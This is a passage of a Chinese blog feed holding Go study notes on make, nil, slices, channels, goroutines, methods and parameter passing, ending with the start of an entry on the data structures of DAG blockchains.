href="https://www.jianshu.com/p/b224982b6fd5">理解 Go 语言包(package)</a><br>【3】<strong>结构体属性导出问题</strong><br>结构体中的属性，如果是小写开头，是无法被跨包使用的，也就是说包外无法访问，太狗了。<br><a href="https://juejin.cn/post/6844903814168838151">Go Struct 超详细讲解</a> 建议好好看看这篇</p><h1 id="函数知识"><a href="#函数知识" class="headerlink" title="函数知识"></a>函数知识</h1><h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>make()函数在 golang 的代码如下：<br><code>func make(t Type,size IntegerType) Type</code><br>使用 make 来创建 slice，map，chanel 说明如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>var slice_ []int = make([]int,5,10)<br>fmt.Println(slice_)<br>var slice_1 []int = make([]int,5)<br>fmt.Println(slice_1)<br>var slice_2 []int = []int&#123;1,2&#125;<br>fmt.Println(slice_2)<br>打印结果：<br>[0 0 0 0 0]<br>[0 0 0 0 0]<br>[1,2]<br></code></pre></td></tr></table></figure><p>在创建 slice 时第一个参数用于确定初始化该 slice 的大小该 slice 中的值为零值，第三个参数用于确定该 slice 的长度<br>map：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">var m_ map[string]int = make(map[string]int)<br>m_[&quot;one&quot;] = 1<br>fmt.Println(m_)<br>var m map[string]int = map[string]int&#123;&quot;1&quot;:1&#125;<br>m[&quot;2&quot;] = 2<br>fmt.Println(m)<br>打印结果：<br>map[one:1]<br>map[1:1 2:2]<br></code></pre></td></tr></table></figure><p>根据 size 大小来初始化分配内存，不过分配后的 map 长度为 0，如果 size 被忽略了，那么会在初始化分配内存时分配一个小尺寸的内存</p><h2 id="nil"><a href="#nil" class="headerlink" title="nil"></a>nil</h2><p>相信写过 Golang 的程序员对下面一段代码是非常非常熟悉的了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    <span class="hljs-comment">// do something....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>当出现不等于<code>nil</code>的时候，说明出现某些错误了，需要我们对这个错误进行一些处理，而如果等于<code>nil</code>说明运行正常。那什么是<code>nil</code>呢？查一下词典可以知道，<code>nil</code>的意思是无，或者是零值。零值，zero value，是不是有点熟悉？在 Go 语言中，如果你声明了一个变量但是没有对它进行赋值操作，那么这个变量就会有一个类型的默认零值。这是每种类型对应的零值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">bool</span>      -&gt; <span class="hljs-literal">false</span><br>numbers -&gt; <span class="hljs-number">0</span><br><span class="hljs-keyword">string</span>    -&gt; <span class="hljs-string">&quot;&quot;</span><br>pointers -&gt; <span class="hljs-literal">nil</span><br>slices -&gt; <span class="hljs-literal">nil</span><br>maps -&gt; <span class="hljs-literal">nil</span><br>channels -&gt; <span class="hljs-literal">nil</span><br>functions -&gt; <span class="hljs-literal">nil</span><br>interfaces -&gt; <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p>举个例子，当你定义了一个 struct：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> <span class="hljs-type">Person</span> struct &#123;<br>  <span class="hljs-type">AgeYears</span> int<br>  <span class="hljs-type">Name</span> string<br>  <span class="hljs-type">Friends</span> []<span class="hljs-type">Person</span><br>&#125;<br><span class="hljs-title">var</span> p <span class="hljs-type">Person</span> // <span class="hljs-type">Person</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-string">&quot;&quot;</span>, nil&#125;<br></code></pre></td></tr></table></figure><p>变量<code>p</code>只声明但没有赋值，所以 p 的所有字段都有对应的零值。那么，这个<code>nil</code>到底是什么呢？Go 的文档中说到，_nil 是预定义的标识符，代表指针、通道、函数、接口、映射或切片的零值_，也就是预定义好的一个变量：</p><h2 id="slices"><a href="#slices" class="headerlink" title="slices"></a>slices</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// nil slices</span><br><span class="hljs-keyword">var</span> s []slice<br><span class="hljs-built_in">len</span>(s)  <span class="hljs-comment">// 0</span><br><span class="hljs-built_in">cap</span>(s)  <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> s  <span class="hljs-comment">// iterates zero times</span><br>s[i]  <span class="hljs-comment">// panic: index out of range</span><br></code></pre></td></tr></table></figure><p>一个为<code>nil</code>的 slice，除了不能索引外，其他的操作都是可以的，当你需要填充值的时候可以使用<code>append</code>函数，slice 会自动进行扩充。那么为<code>nil</code>的 slice 的底层结构是怎样的呢？根据官方的文档，slice 有三个元素，分别是长度、容量、指向数组的指针：<br><img src="https://image.hackerjerry.top/GO%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97-2.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&name=image.png&originHeight=286&originWidth=601&size=27035&status=done&style=none&width=300.5" alt="image.png"><br>当有元素的时候，<br><img src="https://image.hackerjerry.top/GO%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97-3.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=266&originWidth=779&size=50465&status=done&style=none&width=389.5" alt="image.png"></p><h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><blockquote><p>参考：<a href="https://colobu.com/2016/04/14/Golang-Channels/">https://colobu.com/2016/04/14/Golang-Channels/</a></p></blockquote><p>Channel 是 Go 中的一个核心类型，你可以把它看成一个管道，通过它并发核心单元就可以发送或者接收数据进行通讯(communication)。<br>它的操作符是箭头  <strong>&lt;-</strong> 。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">ch &lt;- v    <span class="hljs-comment">// 发送值v到Channel ch中</span><br>v := &lt;-ch  <span class="hljs-comment">// 从Channel ch中接收数据，并将数据赋值给v</span><br></code></pre></td></tr></table></figure><p>(箭头的指向就是数据的流向)<br>就像 map 和 slice 数据类型一样, channel 必须先创建再使用:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)<br></code></pre></td></tr></table></figure><h3 id="定义与用法"><a href="#定义与用法" class="headerlink" title="定义与用法"></a>定义与用法</h3><p>它包括三种类型的定义。可选的<code>&lt;-</code>代表 channel 的方向。如果没有指定方向，那么 Channel 就是双向的，既可以接收数据，也可以发送数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">chan</span> T          <span class="hljs-comment">// 可以接收和发送类型为 T 的数据</span><br><span class="hljs-keyword">chan</span>&lt;- <span class="hljs-keyword">float64</span>  <span class="hljs-comment">// 只可以用来发送 float64 类型的数据</span><br>&lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>      <span class="hljs-comment">// 只可以用来接收 int 类型的数据</span><br></code></pre></td></tr></table></figure><p>使用<code>make</code>初始化 Channel,并且可以设置容量:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>, <span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><p>容量(capacity)代表 Channel 容纳的最多的元素的数量，代表 Channel 的缓存的大小。<br>如果没有设置容量，或者容量设置为 0, 说明 Channel 没有缓存，只有 sender 和 receiver 都准备好了后它们的通讯(communication)才会发生(Blocking)。<strong>如果设置了缓存，就有可能不发生阻塞</strong>， 只有 buffer 满了后 send 才会阻塞， 而只有缓存空了后 receive 才会阻塞。一个 nil channel 不会通信。<br>可以通过内建的<code>close</code>方法可以关闭 Channel。<br>你<strong>可以在多个 goroutine 从/往 一个 channel 中 receive/send 数据, 不必考虑额外的同步措施</strong>。<br>Channel 可以作为一个先入先出(FIFO)的队列，接收的数据和发送的数据的顺序是一致的。<br>channel 的 receive 支持  <em>multi-valued assignment</em>，如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">v, ok := &lt;-ch<br></code></pre></td></tr></table></figure><p>它可以用来检查 Channel 是否已经被关闭了。</p><h3 id="send"><a href="#send" class="headerlink" title="send"></a>send</h3><p>send 语句用来往 Channel 中发送数据， 如<code>ch &lt;- 3</code>。<br>它的定义如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">SendStmt = Channel <span class="hljs-string">&quot;&lt;-&quot;</span> Expression .<br>Channel  = Expression .<br></code></pre></td></tr></table></figure><p>在通讯(communication)开始前 channel 和 expression 必选先求值出来(evaluated)，比如下面的(3+4)先计算出 7 然后再发送给 channel。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(c)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; c &lt;- <span class="hljs-number">3</span> + <span class="hljs-number">4</span> &#125;()<br>i := &lt;-c<br>fmt.Println(i)<br></code></pre></td></tr></table></figure><p>send 被执行前(proceed)通讯(communication)一直被阻塞着。如前所言，无缓存的 channel 只有在 receiver 准备好后 send 才被执行。如果有缓存，并且缓存未满，则 send 会被执行。<br>往一个<strong>已经被 close 的 channel 中</strong>继续发送数据会导致<strong>run-time panic</strong>。<br><strong>往 nil channel 中发送数据会一致被阻塞</strong>着。</p><h3 id="receive"><a href="#receive" class="headerlink" title="receive"></a>receive</h3><p><code>&lt;-ch</code>用来从 channel ch 中接收数据，这个表达式会一直被 block,直到有数据可以接收。<br>从一个 nil channel 中接收数据会一直被 block。<br>从一个被 close 的 channel 中接收数据不会被阻塞，而是立即返回，接收完已发送的数据后会返回元素类型的零值(zero value)。<br>如前所述，你可以使用一个额外的返回参数来检查 channel 是否关闭。</p><h3 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h3><p>缺省情况下，发送和接收会一直阻塞着，直到另一方准备好。这种方式可以用来在 gororutine 中进行同步，而不必使用显示的锁或者条件变量。<br>如官方的例子中<code>x, y := &lt;-c, &lt;-c</code>这句会一直等待计算结果发送到 channel 中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sum</span><span class="hljs-params">(s []<span class="hljs-keyword">int</span>, c <span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)</span></span> &#123;<br>sum := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> s &#123;<br>sum += v<br>&#125;<br>c &lt;- sum <span class="hljs-comment">// send sum to c</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := []<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">-9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>&#125;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)<br><span class="hljs-keyword">go</span> sum(s[:<span class="hljs-built_in">len</span>(s)/<span class="hljs-number">2</span>], c)<br><span class="hljs-keyword">go</span> sum(s[<span class="hljs-built_in">len</span>(s)/<span class="hljs-number">2</span>:], c)<br>x, y := &lt;-c, &lt;-c <span class="hljs-comment">// receive from c</span><br>fmt.Println(x, y, x+y)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h3><p><code>for …… range</code>语句可以处理 Channel。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>time.Sleep(<span class="hljs-number">1</span> * time.Hour)<br>&#125;()<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i = i + <span class="hljs-number">1</span> &#123;<br>c &lt;- i<br>&#125;<br><span class="hljs-built_in">close</span>(c)<br>&#125;()<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> c &#123;<br>fmt.Println(i)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;Finished&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>range c</code>产生的迭代值为 Channel 中发送的值，它会一直迭代直到 channel 被关闭。上面的例子中如果把<code>close(c)</code>注释掉，程序会一直阻塞在<code>for …… range</code>那一行。</p><h3 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h3><p><a href="https://tiancaiamao.gitbooks.io/go-internals/content/zh/03.4.html">https://tiancaiamao.gitbooks.io/go-internals/content/zh/03.4.html</a><br>这个博客讲的挺好的，其他知识也有，可以常看看。<br>另外还有：<a href="https://sanyuesha.com/2017/07/23/go-defer/">https://sanyuesha.com/2017/07/23/go-defer/</a></p><h1 id="其他知识"><a href="#其他知识" class="headerlink" title="其他知识"></a>其他知识</h1><h2 id="goroutine"><a href="#goroutine" class="headerlink" title="goroutine"></a>goroutine</h2><p><a href="https://www.cnblogs.com/wdliu/p/9272220.html">https://www.cnblogs.com/wdliu/p/9272220.html</a> 调度原理<br>代码示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">cal</span><span class="hljs-params">(a <span class="hljs-keyword">int</span> , b <span class="hljs-keyword">int</span> )</span></span>  &#123;<br>    c := a+b<br>    fmt.Printf(<span class="hljs-string">&quot;%d + %d = %d\n&quot;</span>,a,b,c)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;　　<br>    <span class="hljs-keyword">for</span> i :=<span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">10</span> ;i++&#123;<br>        <span class="hljs-keyword">go</span> cal(i,i+<span class="hljs-number">1</span>)  <span class="hljs-comment">//启动10个goroutine 来计算</span><br>    &#125;<br>    time.Sleep(time.Second * <span class="hljs-number">2</span>) <span class="hljs-comment">// sleep作用是为了等待所有任务完成</span><br>&#125;<br><span class="hljs-comment">//结果</span><br><span class="hljs-comment">//8 + 9 = 17</span><br><span class="hljs-comment">//9 + 10 = 19</span><br><span class="hljs-comment">//4 + 5 = 9</span><br><span class="hljs-comment">//5 + 6 = 11</span><br><span class="hljs-comment">//0 + 1 = 1</span><br><span class="hljs-comment">//1 + 2 = 3</span><br><span class="hljs-comment">//2 + 3 = 5</span><br><span class="hljs-comment">//3 + 4 = 7</span><br><span class="hljs-comment">//7 + 8 = 15</span><br><span class="hljs-comment">//6 + 7 = 13</span><br></code></pre></td></tr></table></figure><h3 id="goroutine-异常捕捉"><a href="#goroutine-异常捕捉" class="headerlink" title="goroutine 异常捕捉"></a>goroutine 异常捕捉</h3><p>当启动多个 goroutine 时，如果<strong>其中一个 goroutine 异常</strong>了，并且我们并没有对进行异常处理，<strong>那么整个程序都会终止</strong>，所以我们在编写程序时候最好每个 goroutine 所运行的函数都做异常处理，异常处理采用 recover.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">addele</span><span class="hljs-params">(a []<span class="hljs-keyword">int</span> ,i <span class="hljs-keyword">int</span>)</span></span>  &#123;<br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;    <span class="hljs-comment">//匿名函数捕获错误</span><br>        err := <span class="hljs-built_in">recover</span>()<br>        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;add ele fail&quot;</span>)<br>        &#125;<br>    &#125;()<br>   a[i]=i<br>   fmt.Println(a)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    Arry := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>,<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">for</span> i :=<span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">10</span> ;i++&#123;<br>        <span class="hljs-keyword">go</span> addele(Arry,i)<br>    &#125;<br>    time.Sleep(time.Second * <span class="hljs-number">2</span>)<br>&#125;<br><span class="hljs-comment">//结果</span><br>add ele fail<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>add ele fail<br>add ele fail<br>add ele fail<br>add ele fail<br>add ele fail<br></code></pre></td></tr></table></figure><h2 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h2><p>Go 语言中同时有函数和方法。<strong>一个方法就是一个包含了接受者的函数</strong>，接受者可以是命名类型或者结构体类型的一个值或者是一个指针。<strong>所有给定类型的方法属于该类型的方法集</strong>。语法格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(variable_name variable_data_type)</span> <span class="hljs-title">function_name</span><span class="hljs-params">()</span> [<span class="hljs-title">return_type</span>]</span>&#123;<br>   <span class="hljs-comment">/* 函数体*/</span><br>&#125;<br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-comment">/* 定义结构体 */</span><br><span class="hljs-keyword">type</span> Circle <span class="hljs-keyword">struct</span> &#123;<br>  radius <span class="hljs-keyword">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> c1 Circle<br>  c1.radius = <span class="hljs-number">10.00</span><br>  fmt.Println(<span class="hljs-string">&quot;圆的面积 = &quot;</span>, c1.getArea())<br>&#125;<br><br><span class="hljs-comment">//该 method 属于 Circle 类型对象中的方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c Circle)</span> <span class="hljs-title">getArea</span><span class="hljs-params">()</span> <span class="hljs-title">float64</span></span> &#123;<br>  <span class="hljs-comment">//c.radius 即为 Circle 类型对象中的属性</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">3.14</span> * c.radius * c.radius<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h2><p>数组和切片很像，但是在调用的时候他们传递的类型是不同的！</p><ul><li>Go 语言的数组是值，其长度是其类型的一部分，作为函数参数时，是 <strong>值传递</strong>，函数中的修改对调用者不可见</li><li>Go 语言中对数组的处理，一般采用 <strong>切片</strong> 的方式，切片包含对底层数组内容的引用，作为函数参数时，类似于 <strong>指针传递</strong>，函数中的修改对调用者可见。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 数组</span><br>b := [...]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">boo</span><span class="hljs-params">(tt [6]<span class="hljs-keyword">int</span>)</span></span> &#123;<br>    tt[<span class="hljs-number">0</span>], tt[<span class="hljs-built_in">len</span>(tt)<span class="hljs-number">-1</span>] = tt[<span class="hljs-built_in">len</span>(tt)<span class="hljs-number">-1</span>], tt[<span class="hljs-number">0</span>]<br>&#125;<br>boo(b)<br>fmt.Println(b) <span class="hljs-comment">// [2 3 5 7 11 13]</span><br><span class="hljs-comment">// 切片</span><br>p := []<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">poo</span><span class="hljs-params">(tt []<span class="hljs-keyword">int</span>)</span></span> &#123;<br>    tt[<span class="hljs-number">0</span>], tt[<span class="hljs-built_in">len</span>(tt)<span class="hljs-number">-1</span>] = tt[<span class="hljs-built_in">len</span>(tt)<span class="hljs-number">-1</span>], tt[<span class="hljs-number">0</span>]<br>&#125;<br>poo(p)<br>fmt.Println(p)  <span class="hljs-comment">// [13 3 5 7 11 2]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DAG区块链和传统区块链搭建异同</title>
    <link href="/2021/04/01/DAG%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E4%BC%A0%E7%BB%9F%E5%8C%BA%E5%9D%97%E9%93%BE%E6%90%AD%E5%BB%BA%E5%BC%82%E5%90%8C_new/"/>
    <url>/2021/04/01/DAG%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E4%BC%A0%E7%BB%9F%E5%8C%BA%E5%9D%97%E9%93%BE%E6%90%AD%E5%BB%BA%E5%BC%82%E5%90%8C_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="区块数据类型区别"><a href="#区块数据类型区别" class="headerlink" title="区块数据类型区别"></a>区块数据类型区别</h1><p>dag 的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// blockNode represents a block within the DAG</span><br><span class="hljs-keyword">type</span> blockNode <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> Additions, deletions, or modifications to the order of the</span><br><span class="hljs-comment">// definitions in this struct should not be changed without considering</span><br><span class="hljs-comment">// how it affects alignment on 64-bit platforms.  The current order is</span><br><span class="hljs-comment">// specifically crafted to result in minimal padding.  There will be</span><br><span class="hljs-comment">// hundreds of thousands of these in memory, so a few extra bytes of</span><br><span class="hljs-comment">// padding adds up.</span><br><br><span class="hljs-comment">// parents are the parent block for this node.</span><br>parents []*blockNode<br><br><span class="hljs-comment">// parent metadata like version and extra data</span><br>parentMetadata []*parentInfo<br><br>parentVersion <span class="hljs-keyword">int32</span><br><br><span class="hljs-comment">// hash is the double sha 256 of the block.</span><br>hash 